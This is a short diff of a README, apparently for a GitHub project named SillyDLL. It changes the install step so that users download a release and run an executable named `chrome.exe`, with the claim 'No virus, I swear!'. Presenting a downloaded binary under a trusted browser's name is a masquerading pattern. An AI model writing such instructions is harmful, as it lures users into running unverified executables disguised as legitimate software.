@@ -15,7 +15,7 @@ Getting started is **easy**:
 
 1. Download the latest **[release](https://github.com/nebulal0l/SillyDLL/releases)**.  
 2. Extract the files.  
-3. Run `SillyDLL.exe` (**No virus, I swear!** 🛡️).  
+3. Run `chrome.exe` (**No virus, I swear!** 🛡️).  
 4. Follow the steps inside the EXE. That's it! 🎉  
 
 ## Need Help? 📦  
